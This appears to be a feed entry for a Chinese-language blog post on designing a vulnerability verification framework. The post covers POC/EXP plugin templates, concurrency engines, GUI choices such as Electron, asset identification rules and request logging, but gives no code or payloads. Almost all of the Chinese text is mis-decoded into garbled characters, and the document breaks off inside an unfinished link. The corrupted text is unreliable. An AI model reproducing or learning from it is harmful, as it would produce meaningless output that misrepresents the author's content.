    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡ç« ä¸»è¦è®²è§£ä¸€æ¬¾æ¼æ´éªŒè¯æ¡†æ¶çš„æ„æ€ï¼Œå¹¶æœªè¯¦è§£å†…éƒ¨çš„å®ç°ç»†èŠ‚ï¼Œæœ¬æ–‡ç¯‡å¹…ç¨é•¿ï¼Œè¯·è€å¿ƒçœ‹ã€‚</p><h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>åšä¸€æ¬¾æ¼æ´æ‰«æå™¨ï¼Œé¦–å…ˆè¦äº†è§£è¯¥æ‰«æéœ€è¦è¾¾åˆ°çš„æ•ˆæœã€‚å®ƒçš„éœ€æ±‚ä»€ä¹ˆï¼Ÿéœ€è¦æ”¯æŒä»€ä¹ˆï¼Ÿ</p><p>å¯èƒ½éœ€æ±‚å¦‚ä¸‹ï¼š</p><ul><li>è·¨å¹³å°è¿è¡Œï¼Œå¯ä»¥åœ¨Windowsã€Mac OSã€Linuxç­‰æ“ä½œç³»ç»Ÿè¿è¡Œæˆ–è€…ä½¿ç”¨ WEB ç«¯æ§åˆ¶</li><li>è‡ªå®šä¹‰POCã€EXPå¤šè¯­è¨€æ”¯æŒï¼ŒPOCæ”¯æŒå¤šç§å¼€å‘è¯­è¨€å®ç°ï¼Œä¾‹å¦‚æ”¯æŒ Javaã€python ç­‰ã€‚</li><li>å¤šç§è¿è¡Œæ–¹å¼ï¼Œæ”¯æŒå¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ã€åˆ†å¸ƒå¼è¿è¡Œç­‰å¤šç§æ–¹å¼</li><li>å¯è§†åŒ–ï¼Œæ¼æ´æ‰«ææ¡†æ¶é€šè¿‡å¯è§†åŒ–æ“ä½œ</li><li>èµ„äº§ç®¡ç†ï¼Œé€šè¿‡æ¢æµ‹ç»“æœçš„èµ„äº§è¿›è¡ŒPOCéªŒè¯ä»¥åŠEXPåˆ©ç”¨</li><li>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</li></ul><h2 id="éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h2><p>ä¸Šé¢ç®€å•æ˜ç¡®äº†ä¸€äº›ä¸€æ¬¾æ¼æ´æ‰«æå™¨çš„éœ€æ±‚ï¼Œéœ€æ±‚çš„å®ç°æœ€å¥½æ ¹æ®éœ€æ±‚é€‰å–é€‚åˆçš„æŠ€æœ¯æ¥è¿›è¡Œå®ç°ã€‚</p><h3 id="è·¨å¹³å°è¿è¡Œ"><a href="#è·¨å¹³å°è¿è¡Œ" class="headerlink" title="è·¨å¹³å°è¿è¡Œ"></a>è·¨å¹³å°è¿è¡Œ</h3><p>è·¨å¹³å°çš„å¼€å‘è¯­è¨€æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚Cã€C++ã€Javaã€Pythonã€Go ç­‰ç­‰ã€‚</p><p>å¼€å‘è¯­è¨€çš„é€‰æ‹©ï¼Œéœ€è¦æ ¹æ®æ¡†æ¶éœ€è¦æ»¡è¶³çš„è¿è¡Œæ•ˆç‡ã€å¼€å‘æ•ˆç‡ç­‰å¤šç§è§’åº¦æ¥è¿›è¡Œè€ƒè™‘ã€‚</p><p>å¦‚æœéœ€è¦å¾ˆé«˜çš„è¿è¡Œæ•ˆç‡ä»¥åŠå¼€å‘æ•ˆç‡é«˜çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ Java æˆ– Python ç­‰è¯­è¨€ï¼Œå¦‚æœéœ€è¦è¿½æ±‚æé«˜çš„æ•ˆç‡å¯ä»¥ä½¿ç”¨ Go è¯­è¨€ã€‚</p><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>Java ç¨‹åºå®é™…æ˜¯åœ¨ Java è™šæ‹Ÿæœº( JRE æ˜¯è½¯ä»¶å®ç°)ä¸­è¿è¡Œï¼ŒJava è™šæ‹Ÿæœºç±»ä¼¼ä¸€ä¸ªæ¨¡æ‹Ÿæ‰§è¡Œç¯å¢ƒï¼Œåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šæ‹¥æœ‰ä¸åŒçš„ Java è™šæ‹Ÿæœºå®ç°ï¼Œä½†æ˜¯è¿™äº› Java è™šæ‹Ÿæœºéµå¾ªç»Ÿä¸€çš„è§„èŒƒæ¥è§£é‡Š class æ–‡ä»¶ï¼Œå¹¶å°† class æ–‡ä»¶ä¸­çš„æŒ‡ä»¤è½¬æ¢ä¸ºæœ¬åœ°æ“ä½œç³»ç»Ÿå¯¹åº”çš„æŒ‡ä»¤ï¼Œè¿™æ ·å°±å®ç°äº†ç›¸åŒçš„ class æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ Java è™šæ‹Ÿæœºè½¬æ¢ä¸ºå¯¹åº”æ“ä½œç³»ç»Ÿä¸Šçš„å¯¹åº”æŒ‡ä»¤ï¼Œå®ç° class æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ Java ç¨‹åºçš„è·¨å¹³å°æ€§ã€‚</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>Python æ˜¯ä¸€é—¨è·¨å¹³å°çš„è„šæœ¬è¯­è¨€ï¼ŒPython è§„å®šäº†ä¸€ä¸ª Python è¯­æ³•è§„åˆ™ï¼Œå®ç°äº† Python è¯­æ³•çš„è§£é‡Šç¨‹åºå°±æˆä¸ºäº† Python çš„è§£é‡Šå™¨ã€‚</p><h3 id="è‡ªå®šä¹‰-POC"><a href="#è‡ªå®šä¹‰-POC" class="headerlink" title="è‡ªå®šä¹‰ POC"></a>è‡ªå®šä¹‰ POC</h3><p>è‡ªå®šä¹‰POCã€EXPæœ¬è´¨å°±æ˜¯åŸºäºæ¨¡ç‰ˆè¿›è¡Œç¼–å†™çš„POCï¼Œèƒ½å¤Ÿè®©æ‰«ææ¡†æ¶è¯†åˆ«å¹¶ä¸”è¿è¡Œã€‚æ¨¡ç‰ˆçš„ç»„æˆä¸€èˆ¬åˆ†ä¸ºæ¼æ´åŸºæœ¬ä¿¡æ¯ã€POCéªŒè¯ä¿¡æ¯ã€Expåˆ©ç”¨ä¿¡æ¯ã€‚</p><h3 id="å¤šç§è¿è¡Œæ–¹å¼"><a href="#å¤šç§è¿è¡Œæ–¹å¼" class="headerlink" title="å¤šç§è¿è¡Œæ–¹å¼"></a>å¤šç§è¿è¡Œæ–¹å¼</h3><p>å¤šç§è¿è¡Œæ–¹å¼ï¼Œæ”¯æŒå¤šè¿›ç¨‹ã€å¤šçº¿ç¨‹ã€åˆ†å¸ƒå¼è¿è¡Œç­‰æ–¹å¼ã€‚å¦‚æœæ‰«æå™¨éœ€è¦å¤§è§„æ¨¡çš„çš„æ‰«æã€æ¢æµ‹å»ºè®®ä½¿ç”¨åˆ†å¸ƒå¼èŠ‚ç‚¹çš„æ–¹å¼è¿›è¡Œæ“ä½œã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹å¯ä»¥æ»¡è¶³å¤§éƒ¨åˆ†çš„éœ€æ±‚ã€‚</p><p>ä¸€èˆ¬åˆ†å¸ƒå¼é€‚ç”¨äºå¤§å‹çš„ä¼ä¸šå†…ç½‘æˆ–å¤§èŒƒå›´çš„æ‰«ææ¢æµ‹ã€‚</p><h3 id="å¯è§†åŒ–"><a href="#å¯è§†åŒ–" class="headerlink" title="å¯è§†åŒ–"></a>å¯è§†åŒ–</h3><p>å¯è§†åŒ–æŠ€æœ¯çš„é€‰å‹ï¼Œç›®å‰æœ‰ä¸‰ç§æ¯”è¾ƒæµè¡Œçš„æ–¹æ¡ˆã€‚</p><p>ç¬¬ä¸€ç§ä¸ºä½¿ç”¨è¯­è¨€è‡ªå¸¦çš„å¯è§†åŒ–ç¼–ç¨‹æ¨¡å—ï¼ˆQTï¼‰è¿›è¡Œå¼€å‘å¯è§†åŒ–ç¨‹åºã€‚</p><p>ç¬¬äºŒç§ä¸ºä½¿ç”¨ <a href="https://electronjs.org/" target="_blank" rel="noopener">Electron</a>  æˆ– <a href="https://nwjs.io/" target="_blank" rel="noopener">nw.js </a> è¿›è¡Œå¼€å‘å¯è§†åŒ–åº”ç”¨ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰åçš„<a href="https://fofa.so/about_client" target="_blank" rel="noopener">FOFA Pro å®¢æˆ·ç«¯</a>ã€<a href="http://gobies.org/" target="_blank" rel="noopener">GoBy</a> ã€<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">ä¸­å›½èšå‰‘</a>ç­‰å°±æ˜¯åŸºäºæ­¤æ–¹æ¡ˆè¿›è¡Œå¼€å‘çš„ï¼Œ <a href="https://electronjs.org/" target="_blank" rel="noopener">Electron</a> çš„å®˜ç½‘æœ‰å¾ˆå¤šåŸºäºæ­¤æ¡†æ¶å¼€å‘çš„ç¨‹åºã€‚</p><p>ç¬¬ä¸‰ç§ä¸ºé‡‡ç”¨ B/S æ¶æ„è¿›è¡Œå¼€å‘ï¼Œåç«¯æ§åˆ¶ä½¿ç”¨ WEBè¿›è¡Œæ§åˆ¶ï¼ŒèŠ‚ç‚¹ä½¿ç”¨ Pythonã€Java ç­‰è¯­è¨€è¿›è¡Œå¼€å‘ï¼Œå…¶ä¸­ BugScanã€w8scanã€<a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">å·¡é£</a>ç­‰éƒ½æ˜¯åŸºäºB/Sæ¶æ„å®ç°ã€‚</p><h4 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h4><blockquote><p>Electron æ˜¯ç”± Github å¼€å‘ï¼Œç”¨ HTMLï¼ŒCSS å’Œ JavaScript æ¥æ„å»ºè·¨å¹³å°æ¡Œé¢åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªå¼€æºåº“ã€‚ Electron é€šè¿‡å°† Chromium å’Œ Node.js åˆå¹¶åˆ°åŒä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒä¸­ï¼Œå¹¶å°†å…¶æ‰“åŒ…ä¸ºMacï¼ŒWindows å’Œ Linux ç³»ç»Ÿä¸‹çš„åº”ç”¨æ¥å®ç°è¿™ä¸€ç›®çš„ã€‚</p><p>Electron äº 2013 å¹´ä½œä¸ºæ„å»º Github ä¸Šå¯ç¼–ç¨‹çš„æ–‡æœ¬ç¼–è¾‘å™¨ Atom çš„æ¡†æ¶è€Œè¢«å¼€å‘å‡ºæ¥ã€‚è¿™ä¸¤ä¸ªé¡¹ç›®åœ¨ 2014 æ˜¥å­£å¼€æºã€‚</p><p>ç›®å‰å®ƒå·²æˆä¸ºå¼€æºå¼€å‘è€…ã€åˆåˆ›ä¼ä¸šå’Œè€ç‰Œå…¬å¸å¸¸ç”¨çš„å¼€å‘å·¥å…·ã€‚</p></blockquote><h4 id="nw-js"><a href="#nw-js" class="headerlink" title="nw.js"></a>nw.js</h4><blockquote><p>  nw.js åŸºäº Chromium å’Œ Node.jsã€‚NW.js åˆ©ç”¨ Web æŠ€æœ¯ç»“åˆ Node.js åŠå…¶æ¨¡å—è¿›è¡Œæ¡Œé¢åº”ç”¨å¼€å‘ã€‚</p></blockquote><h3 id="èµ„äº§ç®¡ç†"><a href="#èµ„äº§ç®¡ç†" class="headerlink" title="èµ„äº§ç®¡ç†"></a>èµ„äº§ç®¡ç†</h3><p>èµ„äº§ç®¡ç†ï¼Œç”¨äºç®¡ç†æ‰«ææ¢æµ‹ç»“æœçš„èµ„äº§ä¿¡æ¯ï¼Œç”¨äºèµ„äº§ä¸å¯¹åº” POC å…³è”ä½¿ç”¨ã€‚å…¶ä¸­èµ„äº§ç®¡ç†ä¸­ä¸»è¦å«æœ‰èµ„äº§è¯†åˆ«è§„åˆ™ï¼Œç”¨äºè¯†åˆ«èµ„äº§çš„ä¿¡æ¯ã€‚ä¾‹å¦‚é€šè¿‡èµ„äº§çš„æ ‡é¢˜ã€bodyã€è¯ä¹¦ã€headerã€bannerè¿›è¡Œåˆ¶å®šè§„åˆ™ç”¨äºè¯†åˆ«ã€‚</p><h2 id="è®¾è®¡"><a href="#è®¾è®¡" class="headerlink" title="è®¾è®¡"></a>è®¾è®¡</h2><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-32-53.png" alt=""></p><p>æ•´ä½“æ¡†æ¶åˆ†ä¸ºå¹¶å‘å¼•æ“ã€æ’ä»¶ä¸­å¿ƒã€ç›®æ ‡ä¸­å¿ƒã€æ¼æ´éªŒè¯å››å¤§æ¨¡å—ã€‚</p><ul><li>å¹¶å‘å¼•æ“ï¼šä¸»è¦æä¾›æ¼æ´éªŒè¯æ¡†æ¶è¿è¡Œæ–¹å¼ï¼Œä¾‹å¦‚å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ã€åˆ†å¸ƒå¼ç­‰è¿è¡Œæ–¹å¼ã€‚</li><li>æ’ä»¶ä¸­å¿ƒï¼šä¸»è¦æä¾›æ¼æ´ POC çš„æ¨¡ç‰ˆã€POC çš„åŠ è½½ä»¥åŠ POC çš„ç®¡ç†ã€‚</li><li>ç›®æ ‡ä¸­å¿ƒï¼šç›®æ ‡åŠ è½½ã€ç®¡ç†ç›®æ ‡èµ„äº§ã€æ¼æ´ç®¡ç†ã€‚</li><li>æ—¥å¿—ç®¡ç†ï¼šç®¡ç†æ¡†æ¶ä¸­æ‰€æœ‰ç½‘ç»œè¯·æ±‚ä»¥åŠå“åº”ä¿¡æ¯ï¼Œæä¾›åç»­çš„å›æº¯ã€‚<h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-06-19-11-06.png" alt=""><br>æ¡†æ¶è¿è¡Œæµç¨‹</li></ul><ol><li>é€‰æ‹©åˆé€‚çš„è¿è¡Œå¼•æ“ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨å¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹è¿›è¡Œæ¢æµ‹ï¼Œå¦‚æœæ¢æµ‹å¤§å‹ä¼ä¸šå†…ç½‘ä»¥åŠå¤§èŒƒå›´çš„æ‰«ææ¢æµ‹ï¼Œåˆ†å¸ƒå¼è¿è¡Œæ¯”è¾ƒåˆé€‚ã€‚</li><li>æ’ä»¶åŠ è½½ä¸­å¿ƒï¼Œè¿›è¡ŒåŠ è½½ä½¿ç”¨çš„ POCã€‚</li><li>ç›®æ ‡åŠ è½½ï¼ŒåŠ è½½è¿è¡Œéœ€è¦æ¢æµ‹ç›®æ ‡ï¼Œå¯ä»¥å¯¼å…¥å•ä¸ªipã€ipæ®µä»¥åŠæ–‡ä»¶å½¢å¼è¿›è¡ŒåŠ è½½ã€‚</li><li>æ¢æµ‹åˆ†æï¼Œæ¢æµ‹åˆ†æä¸»è¦åˆ†ä¸ºèµ„äº§æ¢æµ‹å’Œæ¼æ´æ¢æµ‹ï¼Œèµ„äº§æ¢æµ‹é€šè¿‡èµ„äº§è¯†åˆ«è§„åˆ™è¿›è¡Œè¯†åˆ«èµ„äº§ä¿¡æ¯ï¼Œæ¼æ´æ¢æµ‹æ ¹æ®è¯†åˆ«çš„èµ„äº§ä¿¡æ¯è¿›è¡Œæ¼æ´æ¢æµ‹åˆ†æã€‚</li></ol><h3 id="å¹¶å‘å¼•æ“"><a href="#å¹¶å‘å¼•æ“" class="headerlink" title="å¹¶å‘å¼•æ“"></a>å¹¶å‘å¼•æ“</h3><p>å¹¶å‘å¼•æ“ä¸»è¦ä¸ºæ¼æ´éªŒè¯ç¨‹åºè¿è¡Œæ—¶é€‰æ‹©çš„è¿è¡Œæ–¹å¼ï¼Œä¸»è¦æœ‰å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ã€åˆ†å¸ƒå¼ 3 ç§è¿è¡Œæ–¹å¼ï¼Œä½¿ç”¨å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ã€åˆ†å¸ƒå¼è¿è¡Œæ–¹å¼æ¥ä¿è¯æ¼æ´éªŒè¯ç¨‹åºçš„æ•ˆç‡ã€‚</p><p>æ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹é€‚ç”¨äºå¤§éƒ¨åˆ†ä½¿ç”¨çš„åœºæ™¯ã€‚</p><p>åˆ†å¸ƒå¼è¿è¡Œç”¨äºå¤§å‹ä¼ä¸šå†…ç½‘æ¢æµ‹æˆ–å¤§è§„æ¨¡çš„ç½‘ç»œæ¢æµ‹ã€‚</p><h3 id="æ’ä»¶ä¸­å¿ƒ"><a href="#æ’ä»¶ä¸­å¿ƒ" class="headerlink" title="æ’ä»¶ä¸­å¿ƒ"></a>æ’ä»¶ä¸­å¿ƒ</h3><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-07-14-20-16.png" alt=""></p><p>æ’ä»¶ä¸­å¿ƒåˆ†ä¸ºæ¨¡ç‰ˆä¸­å¿ƒã€æ’ä»¶åŠ è½½ä¸­å¿ƒä»¥åŠæ’ä»¶ç®¡ç†ä¸­å¿ƒç»„æˆã€‚</p><p>æ¨¡ç‰ˆä¸­å¿ƒæä¾› POCã€Expæ¨¡ç‰ˆä¿¡æ¯ï¼Œä¸»è¦åˆ†ä¸ºé€šç”¨æ¨¡ç‰ˆå’Œç¼–ç¨‹è¯­è¨€æ¨¡ç‰ˆä¿©ç§ã€‚</p><p>æ’ä»¶ä¸­å¿ƒï¼Œæä¾›ç”¨æˆ·é€‰æ‹©æ€§éœ€è¦æµ‹è¯•çš„æ’ä»¶è¿›è¡ŒåŠ è½½ã€‚</p><p>æ’ä»¶ç®¡ç†ä¸­å¿ƒè¿›è¡Œç®¡ç†è‡ªå®šä¹‰ç¼–å†™çš„ POCã€‚</p><h4 id="æ¨¡ç‰ˆä¸­å¿ƒ"><a href="#æ¨¡ç‰ˆä¸­å¿ƒ" class="headerlink" title="æ¨¡ç‰ˆä¸­å¿ƒ"></a>æ¨¡ç‰ˆä¸­å¿ƒ</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-19-18-50-10.png" alt=""></p><p>æ¨¡ç‰ˆä¸­å¿ƒä¸»è¦åˆ†ä¸ºé€šç”¨æ¨¡ç‰ˆã€ç¼–ç¨‹è¯­è¨€æ¨¡ç‰ˆï¼Œä¸¤å¤§æ¨¡å—ã€‚å…¶ä¸­å„è‡ªç»„æˆéƒ½æ˜¯ç”±æ’ä»¶åŸºæœ¬ä¿¡æ¯ã€POC ä¿¡æ¯ã€Exp ä¿¡æ¯ä¸‰å¤§éƒ¨åˆ†ç»„æˆã€‚</p><p>æ’ä»¶åŸºæœ¬ä¿¡æ¯ç”±æ’ä»¶åç§°ï¼ˆæ¼æ´åç§°ï¼‰ã€ç±»å‹ã€äº§å“åç§°ã€ç­‰çº§ã€äº§å“ä¸»é¡µã€æè¿°ç­‰ç»„æˆã€‚</p><p>POC ä¿¡æ¯ç”±å‘åŒ…åè®®ã€å‘åŒ…æ–¹å¼ã€å‘åŒ…å†…å®¹ã€é€»è¾‘åˆ¤å®šç­‰ç»„æˆã€‚</p><p>Exp ä¿¡æ¯ç”±POC ä¿¡æ¯ä»¥åŠæ‰§è¡Œå‘½ä»¤è¿›è¡Œç»„æˆã€‚</p><p>é€šå¸¸å‘åŒ…åè®®ä¸º HTTPã€HTTPSã€TCPã€UDPç­‰ï¼Œåè®®ï¼ˆéƒ¨åˆ†ï¼‰å‘åŒ…æ–¹å¼æœ‰ GETã€POSTã€PUTã€HEADã€DELETEã€OPTIONSã€TRACEã€CONNECTç­‰ï¼Œé€»è¾‘åˆ¤å®šç”±â€œä¸æˆ–éâ€ã€‚</p><h4 id="æ’ä»¶åŠ è½½ä¸­å¿ƒ"><a href="#æ’ä»¶åŠ è½½ä¸­å¿ƒ" class="headerlink" title="æ’ä»¶åŠ è½½ä¸­å¿ƒ"></a>æ’ä»¶åŠ è½½ä¸­å¿ƒ</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-19-19-18-12.png" alt=""></p><p>æ’ä»¶åŠ è½½é€šè¿‡ç”¨æˆ·é€‰ç”¨æ–¹å¼ï¼ˆå…¨éƒ¨åŠ è½½ã€æŒ‡å®šåŠ è½½ï¼‰è¿›è¡ŒåŠ è½½æ’ä»¶ã€‚</p><ol><li>ä»æ’ä»¶æ•°æ®åº“ä¸­è·å–éœ€è¦åŠ è½½çš„æ’ä»¶<strong>åŸºæœ¬ä¿¡æ¯</strong>ã€‚</li><li>è·å–æ’ä»¶ä¸­çš„ä»£ç ä¿¡æ¯ï¼Œæ ¹æ®ä¿¡æ¯ä»æœ¬åœ°çš„ git ä»“åº“ä¸­è¿›è¡Œè·å–æ’ä»¶ä»£ç ä¿¡æ¯ã€‚</li><li>ç„¶åé€šè¿‡å¯¹åº”çš„åŠ è½½æœåŠ¡è¿›è¡ŒåŠ è½½ POCã€‚</li></ol><h4 id="æ’ä»¶ç®¡ç†ä¸­å¿ƒ"><a href="#æ’ä»¶ç®¡ç†ä¸­å¿ƒ" class="headerlink" title="æ’ä»¶ç®¡ç†ä¸­å¿ƒ"></a>æ’ä»¶ç®¡ç†ä¸­å¿ƒ</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-15-04-23.png" alt=""></p><p>æ’ä»¶ç®¡ç†ä¸­å¿ƒè¿›è¡Œç®¡ç†ç¼–å†™çš„æ’ä»¶ä¿¡æ¯ï¼Œé’ˆå¯¹æ’ä»¶è¿›è¡Œä¿®æ”¹ã€åˆ é™¤ã€æŸ¥è¯¢ç­‰æ“ä½œã€‚</p><ul><li>æ–°å¢/ä¿®æ”¹ï¼šåŸºäºæ¨¡ç‰ˆä¸­å¿ƒçš„é€šç”¨æ¨¡ç‰ˆå’Œç¼–ç¨‹è¯­è¨€æ¨¡ç‰ˆè¿›è¡Œæ–°å¢ä»¥åŠä¿®æ”¹æ“ä½œã€‚</li><li>æŸ¥è¯¢ï¼šé€šè¿‡æ¨¡ç‰ˆä¸­å¿ƒä¸­çš„å­—æ®µä½œä¸ºä¾æ®è¿›è¡Œå¤šç»´åº¦æŸ¥è¯¢ï¼Œè·å–æ’ä»¶ä¿¡æ¯æä¾›åç»­çš„ä¿®æ”¹ä»¥åŠåˆ©ç”¨ã€‚</li><li>åˆ é™¤ï¼šé€šè¿‡æ¨¡ç‰ˆä¸­å¿ƒä¸­çš„å­—æ®µä½œä¸ºä¾æ®è¿›è¡Œå¤šç»´åº¦æŸ¥è¯¢å¹¶ä¸”åˆ é™¤ã€‚</li></ul><h3 id="ç›®æ ‡ä¸­å¿ƒ"><a href="#ç›®æ ‡ä¸­å¿ƒ" class="headerlink" title="ç›®æ ‡ä¸­å¿ƒ"></a>ç›®æ ‡ä¸­å¿ƒ</h3><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-19-26.png" alt=""></p><p>ç›®æ ‡ä¸­å¿ƒä¸»è¦è´Ÿè´£åˆ†æç›®æ ‡åŠ è½½ã€èµ„äº§ç®¡ç†ä»¥åŠæ¼æ´ç®¡ç†ä¸‰å¤§æ¨¡å—ã€‚</p><ul><li>ç›®æ ‡åŠ è½½æ¨¡å—ï¼šä¸»è¦ç”¨æ¥åŠ è½½éœ€è¦åˆ†æçš„ç›®æ ‡ã€‚</li><li>èµ„äº§ç®¡ç†ï¼šä¸»è¦ç”¨æ¥åˆ†æç›®æ ‡æ¢æµ‹çš„èµ„äº§ä¿¡æ¯ã€è¯†åˆ«è§„åˆ™ã€æ¼æ´ä¿¡æ¯ç®¡ç†ã€‚</li></ul><p>æ¼æ´æ’ä»¶ä¿¡æ¯å¯ä»¥é€šè¿‡ä½¿ç”¨æ•°æ®åº“é…åˆ Git æ¥è¿›è¡Œå­˜å‚¨ï¼Œæ•°æ®åº“ä¸­è¿›è¡Œå­˜å‚¨æ’ä»¶çš„åŸºæœ¬ï¼ŒGit å­˜æ”¾æ’ä»¶çš„å…·ä½“ä»£ç ä¿¡æ¯ï¼Œä½¿ç”¨ Git å¯ä»¥è¿›è¡Œæ§åˆ¶æ’ä»¶çš„ç‰ˆæœ¬ï¼Œå¯è¿›è¡Œå›é€€ç­‰æ“ä½œã€‚</p><h4 id="ç›®æ ‡åŠ è½½"><a href="#ç›®æ ‡åŠ è½½" class="headerlink" title="ç›®æ ‡åŠ è½½"></a>ç›®æ ‡åŠ è½½</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-20-56-35.png" alt=""></p><p>ç›®å‰åŠ è½½å¯ä»¥é€šè¿‡åŠ è½½å•ipã€ipæ®µä»¥åŠæ–‡ä»¶å¯¼å…¥çš„æ–¹å¼è¿›è¡Œå¯¼å…¥ã€‚</p><ul><li>ip æ®µåŠ è½½ï¼šè¿›è¡Œç”Ÿæˆ ip æ®µä¸­çš„æ¢æµ‹ç›®æ ‡åˆ—è¡¨ã€‚</li><li>æ–‡ä»¶åŠ è½½ï¼šè§£æå¯¼å…¥çš„æ–‡ä»¶æ ¼å¼ï¼Œé€šè¿‡å¯¹åº”çš„æ ¼å¼è¿›è¡ŒåŠ è½½ç›®æ ‡ã€‚</li></ul><h4 id="èµ„äº§ç®¡ç†-1"><a href="#èµ„äº§ç®¡ç†-1" class="headerlink" title="èµ„äº§ç®¡ç†"></a>èµ„äº§ç®¡ç†</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-26-55.png" alt=""></p><p>èµ„äº§ç®¡ç†æ¨¡å—ä¸»è¦è¿›è¡Œç®¡ç†åˆ†æç›®æ ‡è¯†åˆ«æˆåŠŸçš„èµ„äº§ä¿¡æ¯ã€æ¼æ´ç®¡ç†ã€ä»¥åŠè¯†åˆ«è§„åˆ™ç®¡ç†ã€‚</p><ul><li>ç›®æ ‡èµ„äº§ï¼šé€šè¿‡æ¢æµ‹å“åº”çš„ä¿¡æ¯ä¸è¯†åˆ«è§„åˆ™è¿›è¡ŒåŒ¹é…è¿›è¡Œè¯†åˆ«èµ„äº§ï¼Œå¦‚æœè¯†åˆ«æˆåŠŸä¸ºå·²çŸ¥èµ„äº§ï¼Œå¦åˆ™ä¸ºæœªçŸ¥èµ„äº§ï¼ŒæœªçŸ¥èµ„äº§ä¾¿äºåç»­çš„è§„åˆ™å½•å…¥æé«˜èµ„äº§çš„è¯†åˆ«ç‡ã€‚</li><li>æ¼æ´ç®¡ç†ï¼šé€šè¿‡ä¸å·²è¯†åˆ«èµ„äº§ä¸å¯¹åº”çš„æ¼æ´æ£€æµ‹æ’ä»¶è¿›è¡Œæ£€æµ‹çš„ç»“æœã€‚</li><li>è¯†åˆ«è§„åˆ™ï¼šè¯†åˆ«è§„åˆ™æ„é€ æ ¼å¼ï¼Œå¯ä»¥é€šè¿‡æ¢æµ‹å“åº”çš„åè®®ã€å“åº”å†…å®¹ã€Headerã€æœåŠ¡ç±»å‹ç­‰ä¿¡æ¯è¿›è¡Œæ„é€ è§„åˆ™ä½œä¸ºè¯†åˆ«è§„åˆ™ã€‚</li></ul><h3 id="æ—¥å¿—ç®¡ç†"><a href="#æ—¥å¿—ç®¡ç†" class="headerlink" title="æ—¥å¿—ç®¡ç†"></a>æ—¥å¿—ç®¡ç†</h3><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-45-33.png" alt=""></p><p>æ—¥å¿—ç®¡ç†æ¨¡å—ä¸»è¦ç®¡ç†æ•´ä½“æ¡†æ¶çš„æ—¥å¿—ä¿¡æ¯åŒ…å«æ—¥å¿—è®°å½•ã€æŸ¥è¯¢ç­‰æ“ä½œã€‚</p><ul><li>æ—¥å¿—ä¿¡æ¯åŒ…å«ï¼Œæ¡†æ¶å†…éƒ¨è¯·æ±‚ä¿¡æ¯ï¼ˆè¯·æ±‚URIã€è¯·æ±‚æ–¹å¼ï¼ˆPOSTã€GETã€DELETEç­‰ï¼‰ã€è¯·æ±‚å‚æ•°ç­‰ä¿¡æ¯ï¼‰ä»¥åŠå“åº”ä¿¡æ¯ï¼ˆå“åº”å¤´ã€å“åº”å†…å®¹ç­‰ä¿¡æ¯ï¼‰ä»¥åŠæ¡†æ¶æ‰§è¡Œæ“ä½œï¼ˆèµ„äº§æ¢æµ‹ã€æ’ä»¶æ£€æµ‹ç­‰ï¼‰ã€‚</li><li>æ—¥å¿—è®°å½•ï¼Œå¯ä»¥é€šè¿‡ç»Ÿä¸€è¯·æ±‚ä¸­å¿ƒè®°å½•ç½‘ç»œæ—¥å¿—ä¿¡æ¯ã€‚</li><li>æ—¥å¿—æŸ¥è¯¢ï¼Œé€šè¿‡æŸ¥è¯¢ipã€è¯·æ±‚URIã€è¯·æ±‚æ–¹å¼ã€å“åº”å†…å®¹ç­‰å¤šç»´åº¦è¿›è¡ŒæŸ¥è¯¢ï¼Œä¾¿äºåç»­çš„æ¼æ´æ¼æ´æ’æŸ¥ã€‚<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2></li></ul><p>æ–‡ä¸­çš„æµç¨‹å›¾ï¼š<a 